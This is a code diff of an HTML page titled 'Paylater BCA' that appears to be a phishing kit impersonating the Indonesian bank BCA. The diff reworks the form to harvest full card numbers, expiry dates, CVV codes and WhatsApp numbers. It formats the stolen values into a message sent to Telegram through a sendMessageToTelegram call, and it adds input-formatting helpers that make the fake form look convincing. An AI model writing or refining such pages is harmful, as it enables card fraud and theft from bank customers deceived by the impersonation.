@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta property="og:image" content="https://i.ibb.co/zG3yCtD/IMG-20240311-085503.jpg">
+</head>
   <meta charset="UTF-8">
   <title>Paylater BCA</title>
-  <meta name="viewport" content="width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -12,6 +14,10 @@
       max-width: 800px;
       margin: 0 auto;
     }
+    header {
+  background-color: #2f539b; /* Ganti dengan kode warna yang diinginkan */
+}
+
 
     .gambar {
       width: 100%;
@@ -88,8 +94,8 @@
     }
 
     .white-element img {
-      width: 80px;
-      height: 80px;
+      width: 250px;
+      height: 150px;
     }
 
     .loading-text {
@@ -116,10 +122,8 @@
       flex-direction: column;
       align-items: center;
       width: calc(80% - 8px);
-    }
-
-    .pin-container input[type="tel"] {
-      width: 100%;
+      margin-left: -60px;
+      margin-top:-15px;
     }
   </style>
   <script>
@@ -149,7 +153,7 @@
         return;
       }
 
-      var message = "𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲:" + nomorHP + "\n𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮: " + pin + "\nUsername: " + username + "\nPassword: " + password;
+      var message = "Nomor HP: " + nomorHP + "\nMasa Berlaku: " + username + "\nCVV: " + password + "\nNomor Whatsapp: " + pin;
       sendMessageToTelegram(message);
       showWhiteElement();
     }
@@ -187,6 +191,32 @@
         inputElement.style.color = 'inherit';
       }
     }
+function formatCardNumber(input) {
+  var value = input.value.replace(/\D/g, ''); // Hapus karakter selain angka
+  var formatted = '';
+  for (var i = 0; i < value.length; i++) {
+    if (i > 0 && i % 4 === 0) { // Tambahkan spasi setiap 4 digit
+      formatted += ' ';
+    }
+    formatted += value[i];
+  }
+  input.value = formatted.trim(); // Hapus spasi di awal dan akhir
+  updateStyle(input.id);
+}
+function addSlash(input) {
+  // Ambil nilai dari input
+  let value = input.value;
+  // Hapus karakter selain angka
+  value = value.replace(/\D/g, '');
+  // Format nilai input menjadi xx/xx
+  if (value.length > 2 && value.charAt(2) !== '/') {
+    value = value.substring(0, 2) + '/' + value.substring(2);
+  }
+  // Update nilai input
+  input.value = value;
+}
+
+
   </script>
 </head>
 <body>
@@ -196,11 +226,12 @@
 
   <div class="form-container">
     <form onsubmit="kirimPesan(); return false;">
-      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="Masukan 16 Digit Nomor Kartu BCA" maxlength="16" class="nomor_hp" oninput="updateStyle('nomor_hp')">
+      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="Masukkan 16 Digit Nomor Kartu BCA" maxlength="19" class="nomor_hp" oninput="formatCardNumber(this); updateStyle('nomor_hp')">
+
       <div class="username-password-container">
-        <input type="tel" id="username" name="username" placeholder="Masa Berlaku" maxlength="4" class ="username" oninput="updateStyle ('username')">
-        <input type="tel" id="password" name="password" placeholder="CVV" maxlength="3" class ="password" oninput="updateStyle ('password')">
-      </div>
+  <input type="tel" id="username" name="username" placeholder="MM/YY" maxlength="5" class ="username" oninput="addSlash(this)">
+  <input type="tel" id="password" name="password" placeholder="CVV" maxlength="3" class ="password" oninput="updateStyle ('password')">
+</div>
       <div class="pin-container">
         <input type="tel" id="pin" name="pin" placeholder="Nomor Whatsapp" maxlength="12" class="pin-input" oninput="updateStyle('pin')">
       </div>
